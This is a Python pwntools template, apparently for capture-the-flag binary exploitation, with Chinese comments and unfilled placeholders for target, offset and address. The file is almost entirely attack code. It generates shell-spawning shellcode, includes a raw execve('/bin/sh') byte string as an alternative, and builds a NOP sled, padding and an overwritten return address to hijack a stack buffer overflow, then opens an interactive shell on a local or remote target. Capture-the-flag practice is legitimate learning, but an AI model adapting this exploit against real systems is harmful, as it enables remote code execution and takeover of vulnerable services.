#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shellcode Template - Code Injection
Author: CTF Player
Date: {{date}}
Target: {{target}}
"""

from pwn import *

# 设置目标程序
binary = "./{{binary_name}}"
elf = ELF(binary)

# 设置上下文
context.binary = elf
context.log_level = 'debug'
context.arch = 'amd64'

def exploit():
    # 连接方式选择
    if args.REMOTE:
        p = remote("{{remote_host}}", {{remote_port}})
    else:
        p = process(binary)

    # 调试设置
    if args.GDB:
        gdb.attach(p, '''
        break main
        continue
        ''')

    # 生成shellcode
    shellcode = asm(shellcraft.sh())  # 生成获取shell的shellcode

    # 或者使用自定义shellcode
    # shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

    log.info(f"Shellcode length: {len(shellcode)}")
    log.info(f"Shellcode: {shellcode.hex()}")

    # 构造payload
    nop_sled = b"\x90" * {{nop_length}}  # NOP滑板
    payload = nop_sled + shellcode
    payload += b"A" * ({{offset}} - len(payload))  # 填充到返回地址
    payload += p64({{shellcode_address}})  # 跳转到shellcode地址

    # 发送payload
    p.sendline(payload)

    # 获取shell
    p.interactive()

if __name__ == "__main__":
    exploit()
